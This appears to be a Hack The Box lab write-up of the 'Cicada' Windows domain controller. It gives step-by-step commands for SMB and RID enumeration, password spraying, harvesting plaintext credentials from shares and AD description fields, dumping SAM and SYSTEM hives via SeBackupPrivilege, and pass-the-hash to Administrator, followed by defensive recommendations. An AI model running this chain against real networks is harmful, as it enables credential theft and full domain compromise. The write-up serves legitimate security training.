**IP Address:** `10.10.11.35`  
**OS:** Windows Server 2022  
**Difficulty:** Easy  
**Tags:** #ActiveDirectory, #SMB, #PasswordSpraying, #SeBackupPrivilege, #PassTheHash

---
## Synopsis

Cicada is an easy Windows machine focused on **Active Directory enumeration** and **privilege escalation**.  
The attack chain involves enumerating SMB shares, extracting plaintext credentials from a public file, performing a password spray to identify valid accounts, and chaining multiple user accounts until reaching a privileged user with `SeBackupPrivilege`.  
This privilege allows the extraction of the **SAM** and **SYSTEM** registry hives to obtain the **Administrator** NTLM hash and perform a **Pass-the-Hash** attack to fully compromise the system.

---
## Skills Required

- Basic knowledge of Active Directory and Kerberos  
- Familiarity with SMB enumeration tools (`crackmapexec`, `smbmap`, `smbclient`)  
- Understanding of password spraying techniques  

## Skills Learned

- Enumerating domain users from SMB null sessions  
- Extracting plaintext passwords from shared files  
- Using `crackmapexec` for password spraying and user description harvesting  
- Abusing `SeBackupPrivilege` to dump the SAM and SYSTEM hives  
- Performing Pass-the-Hash with `evil-winrm`

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

We start by verifying whether the target is alive using an ICMP echo request:

``` bash
ping -c 1 10.10.11.35
```

![[GitHub Documentation/EASY/HTB_Cicada_Writeup/screenshots/ping.png]]

The host responds, confirming it is reachable and ready for further enumeration.

---

### 1.2 Port Scanning

We perform a full TCP port scan to identify all open services on the target:

``` bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.35 -oG allPorts
```

- `-p-` → Scan all 65,535 ports.
- `--open` → Show only open ports.
- `-sS` → SYN scan (stealthy and fast).
- `--min-rate 5000` → Increase the speed by sending at least 5000 packets per second.
- `-vvv` → Increase verbosity to view detailed progress.
- `-n` → No DNS resolution for faster scanning.
- `-Pn` → Treat the host as alive (skip host discovery).
- `-oG allPorts` → Save results in grepable format for easy parsing.

![[GitHub Documentation/EASY/HTB_Cicada_Writeup/screenshots/allports.png]]

Once completed, we extract the open ports into a variable for targeted scanning:

``` bash
extractPorts allPorts
```

![[GitHub Documentation/EASY/HTB_Cicada_Writeup/screenshots/extractports.png]]

---

### 1.3 Targeted Scan

Using the open ports obtained from the previous step, we run a targeted Nmap scan with service/version detection and default NSE scripts:

``` bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,63646 10.10.11.35 -oN targeted
```

- `-sC` → Run Nmap's default scripts.
- `-sV` → Detect service versions.
- `-oN targeted` → Output results in human-readable format.

![[GitHub Documentation/EASY/HTB_Cicada_Writeup/screenshots/targeted.png]]

**Findings:**

|Port|Service|Description|
|---|---|---|
|53|DNS|Domain Name System – likely used for internal AD name resolution.|
|88|Kerberos|Authentication service for Active Directory.|
|135|MS RPC|Microsoft RPC endpoint mapper.|
|139|NetBIOS Session|Legacy SMB service used for file and printer sharing.|
|389|LDAP|Lightweight Directory Access Protocol for AD queries.|
|445|SMB|Microsoft SMB file sharing.|
|464|kpasswd|Kerberos password change service.|
|593|RPC over HTTP|Remote Procedure Call over HTTP for remote management.|
|636|LDAPS|Secure LDAP (encrypted directory queries).|
|3268|Global Catalog|AD Global Catalog service for forest-wide searches.|
|3269|Global Catalog|Secure version of the Global Catalog service (SSL/TLS).|
|5985|WinRM|Windows Remote Management (PowerShell remoting).|
|63646|Uncommon Port|High-numbered TCP port; further investigation required.|

The presence of **Kerberos (88)**, **LDAP/LDAPS (389, 636)**, and **SMB (445)** confirms that the target is a **Windows Domain Controller**.

---

## 2. SMB Enumeration

### 2.1 Checking SMB Shares (Unauthenticated)

We start by enumerating SMB shares without credentials:

``` bash
netexec smb 10.10.11.35 --shares
```

![[netexec_shares.png]]

No relevant information is retrieved. This suggests that anonymous access is restricted for most shares.

---

### 2.2 Listing Shares with smbclient (Null Session)

We then attempt a null session connection using `smbclient`:

``` bash
smbclient -L 10.10.11.35 -N
```

![[GitHub Documentation/EASY/HTB_Cicada_Writeup/screenshots/smbclient_null.png]]

Some shares are visible, including `HR`.

---

### 2.3 Guest Access to Shares

Since `guest` access is sometimes enabled on internal networks, we retry with the `guest` account and no password:

``` bash
netexec smb 10.10.11.35 -u 'guest' -p '' --shares
```

![[smbclient_guest_shares.png]]

`HR` and `IPC$` shares are accessible.

---

### 2.4 Checking Share Permissions

To view detailed permissions, we use `smbmap`:

``` bash
smbmap -H 10.10.11.35 -u 'guest' -p ''
```

![[smbmap_guest_nopasswd.png]]

Most shares are inaccessible except for `HR` and `IPC$`.

---

### 2.5 Inspecting HR Share

We recursively list the contents of the `HR` share:

``` bash
smbmap -H 10.10.11.35 -u 'guest' -p '' -r HR
```

![[smbmap_guest_hr.png]]

We find a file named `Notice_from_HR.txt`.

---

### 2.6 Retrieving Sensitive File

We connect via `smbclient` to download the file:

``` bash
smbclient //10.10.11.35/HR -N 
get "Notice from HR.txt" 
cat Notice\ from\ HR.txt
```

![[smbclient_hr_null.png]]

**Finding:**  
The file contains a plaintext password:

`Cicada$M6Corpb*@Lp#nZp!8`

We save it into a file named `credentials.txt` for later use.

![[password.png]]

---

### 2.7 Enumerating Domain Users via RID Brute Force

**Note:** RID brute force is an efficient technique in Active Directory environments as it enumerates accounts by incrementing the Relative Identifier (RID) portion of the Security Identifier (SID). It does not require a username list and can reveal built-in and custom accounts.

As we still do not have a valid username, we enumerate users by brute-forcing RIDs:

``` bash
netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
```

![[netexec_guest_ridbrute.png]]

We clean the output:

``` bash
netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' > users.txt
cat users.txt
```

![[netexec_users.png]]

We can further clean this list and keep only the final usernames with:

``` bash
cat users.txt | tr '\\' ' ' | awk '{print $7}' > users_clean.txt
cat users_clean.txt
```

![[netexec_users_clean.png]]

---

### 2.8 Validating Users with Kerbrute

We confirm which accounts are valid in the domain:

``` bash
kerbrute userenum --dc 10.10.11.35 -d cicada.htb users.txt
```

![[kerbrute_users_clean.png]]

---

### 2.9 Password Spraying with Known Password

**Note:** Password spraying tests one password across many accounts to avoid triggering account lockouts. This is especially useful when lockout policies are strict.

We test the recovered password against all valid users:

``` bash
netexec smb 10.10.11.35 -u users_clean.txt -p credentials.txt
```

![[netexec_users_credentials.png]]

The password matches the account `michael.wrightson`.

---

## 3. Foothold

### 3.1 Testing WinRM Access

We check whether `michael.wrightson` has WinRM access:

``` bash
netexec winrm 10.10.11.35 -u 'michael.wrightson' -p credentials.txt
```

![[netexec_michael.png]]

WinRM is disabled for this account.

---

### 3.2 Enumerating Shares Accessible to Michael

We list accessible shares for this user:

``` bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --shares
```

![[netexec_michael_shares.png]]

Two additional shares, `NETLOGON` and `SYSVOL`, are visible but contain no useful files.

---

### 3.3 Enumerating Domain Users via Michael's Account

**Note:** The `description` attribute in Active Directory user objects is often overlooked. Administrators or users sometimes store plaintext passwords or hints there, making it a common information leak vector.

We switch enumeration mode to `--users` to retrieve user descriptions:

``` bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --users
```

![[netexec_michael_users.png]]

**Finding:**  
The account `david.orelious` has his password stored in the description field:

`aRt$Lp#7t*VQ!3`

---

### 3.4 Accessing David's Account

We confirm the credentials:

``` bash
netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
```

![[netexec_david.png]]

**Result:**  
The login is successful.

---

### 3.5 Checking WinRM for David

``` bash
netexec winrm 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
```

![[netexec_winrm_david.png]]

**Result:**  
WinRM is also disabled for this account.

---

### 3.6 Enumerating Shares for David

``` bash
netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

![[netexec_david_shares.png]]

**Result:**  
David has access to the `DEV` share in addition to the previously seen shares.

---

### 3.7 Inspecting DEV Share

We recursively list the contents of the `DEV` share:

``` bash
smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r DEV
```

![[smbmap_david_DEV.png]]

**Finding:**  
A file named `Backup_script.ps1` is present.

---

### 3.8 Extracting Backup Script

We download and inspect the file:

``` bash
smbclient //10.10.11.35/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3' 
get "Backup_script.ps1" 
cat Backup_script.ps1
```

![[smbclient_get_backup.png]]

**Finding:**  
The script contains plaintext credentials for another account:

`User: emily.oscars Password: Q!3@Lp#M6b*7t*Vt`

---

### 3.9 Checking SMB and WinRM for Emily

``` bash
netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
netexec winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

![[netexec_emily.png]]

Successful.
### 3.10 Gaining Remote Shell with Evil-WinRM

**Note:** `evil-winrm` is a preferred tool for WinRM exploitation as it provides an interactive PowerShell prompt, supports file upload/download, and allows local script execution, which is very useful in post-exploitation.

We confirm that `emily.oscars` has WinRM access and open a remote PowerShell session:

``` bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

![[GitHub Documentation/EASY/HTB_Cicada_Writeup/screenshots/user_flag.png]]

We obtain an interactive shell on the target and retrieve the **user flag** from the desktop.

---

## 4. Privilege Escalation

### 4.1 Checking Current Privileges

**Note:** `SeBackupPrivilege` allows bypassing NTFS permissions by performing system backups. It can be abused to copy sensitive files like registry hives.

Once connected as `emily.oscars`, we check the assigned privileges:

``` bash
net user emily.oscars
whoami /priv
```

![[emily_priv.png]]

**Finding:**  
The account has the `SeBackupPrivilege` enabled and is a member of the **Backup Operators** group.  
This privilege allows us to back up system hives, which can be used to extract credential hashes.

---

### 4.2 Dumping SAM and SYSTEM Hives

We save the `SAM` and `SYSTEM` registry hives to a temporary directory on the target:

``` bash
reg save hklm\sam C:\temp\sam.hive 
reg save hklm\system C:\temp\system.hive
```

**Alternative:** In addition to `reg save`, tools like `diskshadow` or `ntdsutil` can be used to dump hives, but `reg save` is simpler and works reliably on most Windows systems.

---

### 4.3 Downloading the Hives

We transfer both files to our local machine:

``` bash
download sam.hive 
download system.hive
```

---

### 4.4 Extracting NTLM Hashes

We use `impacket-secretsdump` locally to dump the NTLM hashes from the extracted hives:

``` bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

![[local_hives.png]]

**Finding:**  
We recover the **Administrator** NTLM hash:

`2b87e7c93a3e8a0ea4a581937016f341`

---

### 4.5 Pass-the-Hash to Administrator

We reuse the NTLM hash to authenticate as the `Administrator` account via Evil-WinRM:

``` bash
evil-winrm -i 10.10.11.35 -u 'Administrator' -H 2b87e7c93a3e8a0ea4a581937016f341
```

![[GitHub Documentation/EASY/HTB_Cicada_Writeup/screenshots/root_flag.png]]

We gain a privileged shell and retrieve the **root flag** from the Administrator’s desktop.

---
# ✅ MACHINE COMPLETE

---

## Summary of Exploitation Path

1. **SMB Null Session** → Access to `HR` share with default password.
2. **RID Brute Force** → Enumerated domain users.
3. **Password Spraying** → Found `michael.wrightson` using default password.
4. **User Description Leak** → Retrieved `david.orelious` credentials.
5. **Share Enumeration** → Extracted `emily.oscars` credentials from `DEV` share.
6. **SeBackupPrivilege Abuse** → Extracted SAM & SYSTEM hives to get Administrator NTLM hash.
7. **Pass-the-Hash** → Full domain compromise.

---

## Defensive Recommendations

- **Restrict anonymous SMB access** and disable null sessions to prevent unauthenticated share enumeration.
- **Audit and remove plaintext passwords** or sensitive information from Active Directory user attributes (especially the `description` field).
- **Limit share permissions** to only necessary accounts and enforce the principle of least privilege.
- **Remove `SeBackupPrivilege`** from non-administrative accounts to prevent registry hive dumping.
- **Monitor and alert** on RID brute force attempts by tracking Windows Event ID 4625 (failed logons) with repeated `Logon Type 3` events from the same IP.
- **Implement account lockout policies** to reduce the effectiveness of password spraying, and monitor for multiple failed logins across different accounts.
- **Enable Credential Guard** and enforce NTLM restrictions to mitigate Pass-the-Hash attacks.
- **Regularly audit high-privilege groups** like Backup Operators and Administrators for unauthorized members.
- **Segment the network** to restrict access to sensitive services like SMB, WinRM, and LDAP from untrusted subnets.